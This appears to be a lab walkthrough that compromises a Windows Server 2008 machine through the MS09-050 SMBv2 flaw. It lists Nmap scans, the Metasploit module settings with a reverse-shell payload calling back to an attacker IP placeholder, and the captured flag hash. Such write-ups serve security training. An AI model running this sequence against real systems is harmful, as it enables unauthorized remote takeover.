# Internal - Windows Server 2008 Exploitation Walkthrough

This is a full exploitation walkthrough for the Internal lab machine running Windows Server 2008 Standard SP1. The objective was to exploit a vulnerable SMBv2 service and gain SYSTEM-level access, followed by flag capture.

## Target Information

IP Address: 192.168.212.40  
Operating System: Windows Server 2008 Standard SP1  
Hostname: INTERNAL  
Domain: WORKGROUP

## Enumeration

Performed an initial Nmap scan:

nmap -T4 -A -Pn 192.168.212.40 -o nmap

Discovered open ports:
- 53 (DNS)
- 135 (MSRPC)
- 139, 445 (SMB)
- 3389 (RDP)
- 5357 (HTTPAPI)
- 49152–49158 (MSRPC Dynamic Ports)

Operating system detected: Windows Server 2008 SP1  
Computer name: INTERNAL  
Message signing: disabled  
Guest access allowed: Yes  

## Vulnerability Scan

Ran vulnerability detection script on SMB port:

nmap -Pn -p445 --script vuln 192.168.212.40

Found vulnerability:  
CVE-2009-3103 - SMBv2 Negotiation Vulnerability  
The target is vulnerable to remote code execution via an array index error in the SMBv2 protocol implementation.

## Exploitation

Launched Metasploit and selected the appropriate module:

use exploit/windows/smb/ms09_050_smb2_negotiate_func_index

Set the target IP and payload:

set RHOSTS 192.168.212.40  
set PAYLOAD windows/meterpreter/reverse_tcp  
set LHOST <Your_Attacker_IP>  
run

Gained SYSTEM-level access.

## Captured Flag

Located the proof file:

C:\Users\Administrator\Desktop\proof.txt

Flag:

47c6c1ee45afde9538e4abfb88abe848

## Tools Used

- nmap  
- metasploit-framework  
- ms09_050 SMBv2 exploit module

## Summary

- Discovered vulnerable SMBv2 service on port 445  
- Identified CVE-2009-3103 through Nmap scripts  
- Exploited vulnerability using Metasploit  
- Gained SYSTEM access  
- Retrieved the administrator flag

## Author

Farhanahmad Quraishi
